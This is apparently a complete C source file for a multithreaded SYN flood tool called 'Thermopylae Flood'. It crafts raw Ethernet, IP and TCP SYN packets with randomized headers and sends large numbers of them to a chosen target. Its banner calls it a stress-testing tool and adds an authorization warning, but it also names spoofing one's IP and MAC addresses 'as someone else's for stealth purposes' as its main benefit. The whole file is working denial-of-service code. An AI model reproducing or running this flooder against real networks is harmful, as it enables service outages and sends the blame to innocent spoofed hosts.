#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <net/if.h>
#include <sys/random.h>
#include <errno.h>
#include <stdint.h>
#include <limits.h>


/* ─── ANSI Color Codes ─────────────────────────────────────────── */
#define RESET       "\033[0m"
#define BOLD        "\033[1m"
#define DIM         "\033[2m"

#define FG_CYAN     "\033[36m"
#define FG_WHITE    "\033[37m"
#define FG_BRED     "\033[1;31m"
#define FG_BGREEN   "\033[1;32m"
#define FG_BYELLOW  "\033[1;33m"
#define FG_BWHITE   "\033[1;37m"
/* ─── ANSI Color Codes ─────────────────────────────────────────── */


int ip_input_checker(char*);
int port_input_checker(char*);
int mac_input_checker(char*);
int str_to_ull(const char*, unsigned long long*);
int str_to_u_int16_t(const char*, u_int16_t*);
int increment_and_check(const char*, int*, int);

void help_menu(int);
void clear_screen(void);
void print_banner(void);


typedef struct pseudo_header
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int16_t protocol;
	u_int16_t tcp_length;

}pseudo_header;

typedef struct thread_args
{
	char packet_to_be_send[4096];
	int tot_len;
	struct sockaddr_ll ll;
	size_t data_len;
	char* source_ip_address;
    char* dest_ip_address;
    unsigned long long packet_count_per_thread;
    
}thread_args;

unsigned short checksum(unsigned short *ptr, int bytes)
{
	u_int32_t sum;
	u_int16_t leftbyte;

	sum = 0;

	while(bytes > 1)
	{
		sum += *ptr;
		ptr++;
		bytes -= 2;
	}

	if(bytes == 1)
	{
		leftbyte = 0;
		*((u_int8_t*)&leftbyte) = *(u_int8_t*)ptr;
		sum += leftbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum = (sum >> 16) + (sum & 0xffff);
	return((u_int16_t)~sum);
}

void* sender(void* arg)
{

	thread_args* args = (thread_args*)arg;
	int local_fd = -1;

	if((local_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("[-] local socket creation failed");
		return NULL;
	}

	printf("started\n");

    uint32_t rand_seq;
    uint16_t rand_ip_id, rand_src_port, rand_window;
    uint8_t  rand_ttl, rand_tos;

    char *checksum_buffer_storage = malloc(sizeof(pseudo_header) + sizeof(struct tcphdr) + args->data_len);
	if (!checksum_buffer_storage) 
	{
	    perror("malloc failed");
	    close(local_fd);
	    return NULL;
	}	


	for(register unsigned long long i = 0 ; i < args->packet_count_per_thread ; i++)
	{	

		if (getrandom(&rand_seq, sizeof(rand_seq), 0) < 0) 
		{
		    perror("getrandom failed");
		    return NULL;
		}

		if (getrandom(&rand_ip_id, sizeof(rand_ip_id), 0) < 0) 
		{
		    perror("getrandom failed");
		    return NULL;
		}

		if (getrandom(&rand_src_port, sizeof(rand_src_port), 0) < 0) {
		    perror("getrandom failed");
		    return NULL;
		}
		if (getrandom(&rand_window, sizeof(rand_window), 0) < 0) {
		    perror("getrandom failed");
		    return NULL;
		}
		if (getrandom(&rand_ttl, sizeof(rand_ttl), 0) < 0) {
		    perror("getrandom failed");
		    return NULL;
		}
		if (getrandom(&rand_tos, sizeof(rand_tos), 0) < 0) {
		    perror("getrandom failed");
		    return NULL;
		}

		struct iphdr* iph = (struct iphdr*)((char*)args->packet_to_be_send + sizeof(struct ethhdr));
		struct tcphdr* tcph = (struct tcphdr*)((char*)iph + sizeof(struct iphdr));

		pseudo_header psh; 
		if(inet_pton(AF_INET, args->source_ip_address, &psh.source_address) <= 0)
		{
			perror("[-] Invalid source_ip");
			exit(EXIT_FAILURE);
		}

		if(inet_pton(AF_INET, args->dest_ip_address, &psh.dest_address) <= 0)
		{
			perror("[-] Invalid destination_address");
			exit(EXIT_FAILURE);
		}
		psh.placeholder = 0;
		psh.protocol = IPPROTO_TCP;
		psh.tcp_length = htons(sizeof(struct tcphdr) + args->data_len);

	    uint16_t final_src_port = 1024 + (rand_src_port % 64511);
	    uint8_t  final_ttl      = 64   + (rand_ttl      % 64);
	    uint16_t final_window   = 1024 + (rand_window    % 64512);

	    iph->tos      = rand_tos & 0x1C;
	    iph->id       = htons(rand_ip_id);
	    iph->ttl      = final_ttl;
	    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + args->data_len);
	    iph->check    = 0;
	    iph->check = checksum((unsigned short*)iph, sizeof(struct iphdr));

	    tcph->source  = htons(final_src_port);
	    tcph->seq     = htonl(rand_seq);
	    tcph->window  = htons(final_window);
	    tcph-> check = 0;
	    
		u_int16_t packet_size = sizeof(pseudo_header) + sizeof(struct tcphdr) + args->data_len;
		memcpy(checksum_buffer_storage, &(psh), sizeof(pseudo_header));
		memcpy(checksum_buffer_storage + sizeof(pseudo_header), tcph, sizeof(struct tcphdr) + args->data_len);
		tcph->check = checksum((unsigned short*)checksum_buffer_storage, packet_size);

		if(sendto(local_fd, args->packet_to_be_send, args->tot_len, 0, (struct sockaddr*)&args->ll, sizeof(args->ll)) < 0) perror("[-] sendto failed");
	}

	free(checksum_buffer_storage);
	close(local_fd);
	return NULL;

}


int main(int argc, char** argv)
{
	print_banner();

	char* dest_ip_address = NULL;
	char* dest_mac_address = NULL;
	int dest_port = 0;
	char* source_ip_address = NULL;
	char* source_mac_address = NULL;
	char* interface_name = NULL;
	int source_port = 0;
	u_int16_t threads_count = 10;
	unsigned long long packet_count = 0;

	int i = 1;
	int max_threads = sysconf(_SC_NPROCESSORS_ONLN) * 4;

	while(i < argc)
	{

		if(strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0)
		{
			help_menu(max_threads);
		}

		else if(strcmp(argv[i], "-t") == 0)
		{	
			if(increment_and_check("-t", &i, argc) < 0) help_menu(max_threads);

			if(str_to_u_int16_t(argv[i], &threads_count) < 0) help_menu(max_threads);
			if(threads_count > max_threads)
			{
				printf("[-] Threads number is invalid");
				help_menu(max_threads);
			}
			++i;
		}

		else if(strcmp(argv[i], "-di") == 0)
		{
			if(increment_and_check("-di", &i, argc) < 0) help_menu(max_threads);

			ip_input_checker(argv[i]);
			dest_ip_address = argv[i];
			++i;
		}

		else if(strcmp(argv[i], "-dp") == 0)
		{	
			if(increment_and_check("-dp", &i, argc) < 0) help_menu(max_threads);

			port_input_checker(argv[i]);
			dest_port = atoi(argv[i]);
			++i;
		}

		else if(strcmp(argv[i], "-dm") == 0)
		{	
			if(increment_and_check("-dm", &i, argc) < 0) help_menu(max_threads);

			mac_input_checker(argv[i]);
			dest_mac_address = argv[i];
			++i;
		}

		else if(strcmp(argv[i], "-si") == 0)
		{
			if(increment_and_check("-si", &i, argc) < 0) help_menu(max_threads);

			ip_input_checker(argv[i]);
			source_ip_address = argv[i];
			++i;
		}

		else if(strcmp(argv[i], "-sm") == 0)
		{	
			if(increment_and_check("-sm", &i, argc) < 0) help_menu(max_threads);

			mac_input_checker(argv[i]);
			source_mac_address = argv[i];
			++i;
		}

		else if(strcmp(argv[i], "-i") == 0)
		{
			if(increment_and_check("-i", &i, argc) < 0) help_menu(max_threads);

			if(if_nametoindex(argv[i]) == 0)
			{
				printf("[-] Please enter a valid interface name");
				help_menu(max_threads);
			}
			else interface_name = argv[i];
			++i;
		}

		else if(strcmp(argv[i], "-c") == 0)
		{
			if(increment_and_check("-c", &i, argc) < 0) help_menu(max_threads);

			if(str_to_ull(argv[i], &packet_count) < 0) help_menu(max_threads);
			++i;
		}

		else
		{
			printf("[-] Please use valid arguments");
			help_menu(max_threads);
		}

	}

	if(dest_ip_address == NULL || source_ip_address == NULL || dest_port == 0 || dest_mac_address == NULL || source_mac_address == NULL || interface_name == NULL || packet_count <= 0)
	{
		printf("[-] Some Required arguments are missing");
		help_menu(max_threads);
	}
	

	char packet[4096], *data = NULL;
	memset(packet, 0, 4096);


	struct ethhdr *eth = (struct ethhdr*)packet;
	struct iphdr *iph = (struct iphdr*)((char*)eth + sizeof(struct ethhdr));
	struct tcphdr *tcph = (struct tcphdr*)((char*)iph + sizeof(struct iphdr));
	

	data = (char*)tcph + sizeof(struct tcphdr);
	snprintf(data, 15, "KNOCK KNOCK");
	data[14] = '\0';

	dest_ip_address[strcspn(dest_ip_address, "\n")] = '\0';

/////////////////////////

	struct sockaddr_ll ll;
	memset(&ll, 0, sizeof(struct sockaddr_ll));
	ll.sll_family = AF_PACKET;
	ll.sll_ifindex = if_nametoindex(interface_name);
	ll.sll_halen = ETH_ALEN;
	memcpy(ll.sll_addr, ether_aton(dest_mac_address), 6);



	memcpy(&(eth->h_source), ether_aton(source_mac_address), 6);
	memcpy(&(eth->h_dest), ether_aton(dest_mac_address), 6);
	eth->h_proto = htons(ETH_P_IP);



	iph->ihl = 5;
	iph->version = 4;
	iph->frag_off = 0;
	iph->protocol = IPPROTO_TCP;
	if(inet_pton(AF_INET, source_ip_address, &(iph->saddr)) <= 0)
	{
		perror("[-] Invalid source_address");
		exit(EXIT_FAILURE);
	}
	if(inet_pton(AF_INET, dest_ip_address, &(iph->daddr)) <= 0)
	{
		perror("[-] Invalid destination_address");
		exit(EXIT_FAILURE);
	}
	


	tcph->dest = htons(dest_port);
	tcph->ack_seq = 0;
	tcph->doff = 5;
	tcph->fin = 0;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->syn = 1;
	tcph->urg_ptr = 0;


/////////////////////////

	thread_args *args_array = calloc(threads_count, sizeof(thread_args));
	thread_args thread_args_blueprint;

	memcpy(thread_args_blueprint.packet_to_be_send, packet, 4096);
	thread_args_blueprint.tot_len = sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
	memcpy(&(thread_args_blueprint.ll), &ll, sizeof(struct sockaddr_ll));
	thread_args_blueprint.data_len = strlen(data);
	thread_args_blueprint.dest_ip_address = dest_ip_address;
	thread_args_blueprint.source_ip_address = source_ip_address;
	thread_args_blueprint.packet_count_per_thread = packet_count/threads_count;

	pthread_t thread_id[threads_count];

	for(register int j = 0 ; j < threads_count ; j++)
	{
		memcpy(&args_array[j], &thread_args_blueprint, sizeof(thread_args));
		if(pthread_create(&thread_id[j], NULL, sender, &args_array[j]) != 0)
		{

			perror("Thread creation failed");
			exit(EXIT_FAILURE);

		}

	}


	for(register int k = 0 ; k < threads_count ; k++)
	{
		pthread_join(thread_id[k], NULL);
	}

	free(args_array);
	return 0;
}


int ip_input_checker(char *ip_address)
{		
	char *newline = strchr(ip_address, '\n');
	if(newline != NULL) *newline = '\0';
	
	if(inet_pton(AF_INET, ip_address, &(struct in_addr){0}) == 1) return 0;
	printf("[-] Please enter a valid ip_address\n");
	exit(1);
}


int port_input_checker(char *str_port)
{
    int parsed = atoi(str_port);
    if(parsed >= 1 && parsed <= 65535) return 0;

    printf("[-] Please enter a valid port\n");
    exit(1);
}


int mac_input_checker(char *mac_address)
{
	if(ether_aton(mac_address) != NULL) return 0;
	printf("[-] Please enter a valid mac address\n");
	exit(1);
}


int str_to_u_int16_t(const char* input, u_int16_t *output)
{	

	if (input[0] == '-')
    {
        printf("Error: Negative numbers not allowed.\n");
        return -1;
    }

	char *endptr = NULL;
	errno = 0;

    unsigned long result = strtoul(input, &endptr, 10);

    if (errno == ERANGE || result > UINT16_MAX)
    {
        printf("[-] Error: Value out of range.\n");
        return -1;
    }
    else if (input == endptr)
    {
        printf("[-] Error: No digits found.\n");
        return -1;
    }
    else if (*endptr != '\0')
    {
        printf("[-] Error: Trailing garbage '%s'.\n", endptr);
        return -1;
    }

    *output = (u_int16_t)result;
    return 0;

}


int str_to_ull(const char *input, unsigned long long *output)
{

	if (input[0] == '-')
    {
        printf("Error: Negative numbers not allowed.\n");
        return -1;
    }

    char *endptr;
    errno = 0;

    unsigned long long result = strtoull(input, &endptr, 10);

    if (errno == ERANGE)
    {
        printf("[-] Error: Value out of range (0 - %llu).\n", ULLONG_MAX);
        return -1;
    }
    else if (input == endptr)
    {
        printf("[-] Error: No digits found.\n");
        return -1;
    }
    else if (*endptr != '\0')
    {
        printf("[-] Error: Trailing garbage '%s'.\n", endptr);
        return -1;
    }

    *output = (unsigned long long)result;
    return 0;
}


int increment_and_check(const char* flag, int* i, int argc)
{
	if(++(*i) > argc)
	{
		printf("[-] Empty value for flag %s", flag);
		return -1;
	}

	return 0;
}


void help_menu(int max_threads)
{	
	printf("\n\n    ======================Required Args======================");
	printf("\n\n    -di : To set the destination ip address ex :- (-di 192.168.2.3)");
	printf("\n    -dm : To set the destination mac addres :- (-dm 7a:5b:56:25:ff:e6)");
	printf("\n    -dp : To set the destination port ex :- (-dp 80)");
	printf("\n    -si : To set the source ip address :- (-si 192.168.8.3)");
	printf("\n    -sm : To set the source mac addres :- (-sm ff:45:6f:d7:e8:5a)");
	printf("\n    -i  : To specify the interface name");
	printf("\n    -c  : To set the packet counts to be sent");
	printf("\n\n    ======================Non-Required Args======================");
	printf("\n\n    -h or --help : To show this help message");
	printf("\n    -t  : Threads count, Defualt is 10. ex :- (-t 16)  |  Attention : For your machine, the maximum safe thread count is : %d\n\n", max_threads);

	exit(1);
}

// NOTE :- The banner is developed with help of claude AI

void clear_screen(void) {
    write(STDOUT_FILENO, "\033[2J\033[H", 7);
}

void print_banner(void) 
{
    clear_screen();

    printf("\n");
    printf(FG_CYAN "  ╔═══════════════════════════════════════════════════════════════╗\n" RESET);
    printf(FG_CYAN "  ║                                                               ║\n" RESET);
    printf(FG_BRED BOLD
    "  ║  ████████╗██╗  ██╗███████╗██████╗ ███╗   ███╗ ██████╗         ║\n"
    "  ║  ╚══██╔══╝██║  ██║██╔════╝██╔══██╗████╗ ████║██╔═══██╗        ║\n"
    "  ║     ██║   ███████║█████╗  ██████╔╝██╔████╔██║██║   ██║        ║\n"
    "  ║     ██║   ██╔══██║██╔══╝  ██╔══██╗██║╚██╔╝██║██║   ██║        ║\n"
    "  ║     ██║   ██║  ██║███████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝        ║\n"
    "  ║     ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝         ║		\"MOLON LABE\" — Come and Take Them  — King Leonidas I\n" RESET);
    printf(FG_CYAN "  ║                                                               ║         300 Spartans held the pass. Will your network hold the load?\n" RESET);
    printf(FG_BRED BOLD
    "  ║  ███████╗██╗      ██████╗  ██████╗ ██████╗                    ║\n"
    "  ║  ██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗                   ║\n"
    "  ║  █████╗  ██║     ██║   ██║██║   ██║██║  ██║                   ║\n"
    "  ║  ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║                   ║\n"
    "  ║  ██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝                   ║\n"
    "  ║  ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝                    ║\n" RESET);
    printf(FG_CYAN "  ║                                                               ║\n" RESET);
    printf(FG_CYAN "  ║  " RESET FG_BGREEN "  SYN Flood Network Stress Testing Tool                    " RESET FG_CYAN "  ║\n" RESET);
    printf(FG_CYAN "  ║  " RESET FG_BRED BOLD "  Inspired by Thermopylae war                    " RESET FG_CYAN "  	  ║\n" RESET);
    printf(FG_CYAN "  ║  " RESET DIM FG_WHITE "  By Piyumila Perera | Network Security Research | v2.0.0" RESET FG_CYAN "    ║\n" RESET);
    printf(FG_CYAN "  ╚═══════════════════════════════════════════════════════════════╝\n" RESET);
    printf("\n");
    printf( "  ❯ " RESET FG_BRED BOLD "The main benefit of this tool is that you can spoof your ip address and mac address as someone else's for stealth purposes.\n");
    printf("\n");
    printf(FG_CYAN DIM "  ⓘ  Warning: Use only on systems you own or have explicit\n" RESET);
    printf(FG_CYAN DIM "     written permission to test. Unauthorized use is illegal.\n" RESET);
    printf("\n");
}